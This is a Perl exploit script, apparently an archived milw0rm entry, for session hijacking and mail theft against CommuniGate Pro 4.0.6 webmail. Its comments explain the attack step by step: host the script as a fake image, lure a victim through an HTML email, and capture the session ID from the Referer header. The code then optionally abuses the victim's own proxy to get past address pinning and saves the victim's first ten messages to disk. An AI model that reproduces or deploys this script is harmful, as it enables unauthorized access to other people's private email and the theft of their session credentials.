#!/usr/bin/perl

# Below is exploit code. Place it into cgi-bin, then
# (recommended) make symlink from
# DocumentRoot/AnyImage.gif to shj.pl, configure
# at least $url variable, and possible other vars and
# send victim HTML message with img src to your
# AnyImage.gif. When victim will read message, script
# will download messages 1..10 from his mailbox (if
# sucessfull).

# Script will work even if "require fixed address" option
# enabled (set $abuseproxy=1), but it needs access to
# users proxy (IP will be detected automatically). So, if
# your victim uses same corporate proxy as you, then 
# you're lucky, you can own his mailbox! :)

# If victim uses HTTPS to access CGP webmail, use
# https:// link to image. some browsers will still send
# HTTP_REFERER if _both_ sites are https.
#
# session hijacking and mail downloading exploit for CommuniGatePro 4.0.6
#
# Yaroslav Polyakov. xenon@sysAttack.com www.sysAttack.com
#

use LWP::UserAgent;

# configuration vars
$logfile="/tmp/log";
$url="http://COMMUNIGATE/Session/%SID%/Message.wssp?Mailbox=INBOX&MSG=%N%";
$SIDREGEXP="Session/([0-9a-zA-Z\-]+)/";
$msglonum=1;
$msghinum=10;
$msgprefix="/tmp/hijacked-";
$abuseproxy=1;
$proxyport=3128;

sub printgif
{
$gif1x1="\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00\xc0\xc0\xc0
\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00
\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";


  print "Content-Type: image/gif\n";
  print "\n";
  print "$gif1x1";
}


open LOG, "> $logfile" || die("cant write to my log");
printgif;



$remote=$ENV{'REMOTE_ADDR'};
$referer=$ENV{'HTTP_REFERER'};
print LOG "remote: $remote\nreferer: $referer\n";
# if($referer=~/SID=([0-9a-zA-Z\-]+)/){
if($referer=~/$SIDREGEXP/){
                $SID=$1;
                print LOG "SID: $SID\n";
                }else{
                                print LOG "sorry, cant
find out SID\n";
                                exit;
                }



# create request
my $ua = new LWP::UserAgent;
$ua->agent("shj - sysAttack CGP session HiJack/1.0");

if($abuseproxy){
                print LOG "set proxy
http://$remote:$proxyport/\n";
                $ua->proxy('http',
"http://$remote:$proxyport/");
}

for($index=$msglonum;$index<=$msghinum;$index++){
               $eurl=$url;
                $eurl =~ s/%N%/$index/;
                $eurl =~ s/%SID%/$SID/;
                print LOG "fetching $eurl\n";
                $request = new HTTP::Request("GET", $eurl);
                $response = $ua->request($request);
                if($response){
                                print LOG
$response->code." ".$response->message
."\n";
                                open MSG, ">
$msgprefix$index" or die('cant crea
te $msgprefix$index');
                                print MSG
$response->content;
                                close MSG;
                }else{
                                print LOG "undefined
response\n";
                }
}
close LOG;



# milw0rm.com [2003-05-05]
